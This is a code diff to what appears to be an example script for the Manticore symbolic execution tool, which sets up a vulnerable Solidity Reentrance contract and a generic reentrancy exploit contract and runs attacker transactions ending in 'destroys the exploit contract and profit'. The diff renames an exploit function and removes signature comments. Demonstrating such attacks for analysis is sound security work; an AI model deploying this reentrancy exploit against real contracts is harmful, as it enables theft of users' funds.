@@ -1,4 +1,4 @@
-from seth import ManticoreEVM
+from manticore.seth import ManticoreEVM
 ################ Script #######################
 
 seth = ManticoreEVM()
@@ -27,10 +27,6 @@ contract Reentrance {
         userBalance[msg.sender] = 0;
     }   
 }
-//Function signatures: 
-//c0e317fb: addToBalance()
-//f8b2cb4f: getBalance(address)
-//5fd8c710: withdrawBalance()
 '''
 
 exploit_source_code = '''
@@ -58,7 +54,7 @@ contract GenericReentranceExploit {
         reentry_reps = reps;
     }
 
-    function delegate(bytes data) payable{
+    function proxycall(bytes data) payable{
         // call addToBalance with msg.value ethers
         vulnerable_contract.call.value(msg.value)(data);
     }
@@ -76,12 +72,6 @@ contract GenericReentranceExploit {
         }
     }
 }
-//Function signatures: 
-//0ccfac9e: delegate(bytes)
-//b8029269: get_money()
-//9d15fd17: set_reentry_attack_string(bytes)
-//0d4b1aca: set_reentry_reps(int256)
-//beac44e7: set_vulnerable_contract(address)
 '''
 
 
@@ -115,10 +105,10 @@ exploit_account.set_reentry_attack_string(seth.SByte(4))
 
 #Attacker is
 print "[+] Attacker first transaction"
-exploit_account.delegate(seth.SByte(4), value=seth.SValue)
+exploit_account.proxycall(seth.SByte(4), value=seth.SValue)
 
 print "[+] Attacker second transaction" 
-exploit_account.delegate(seth.SByte(4))
+exploit_account.proxycall(seth.SByte(4))
 
 print "[+] The attacker destroys the exploit contract and profit" 
 exploit_account.get_money()
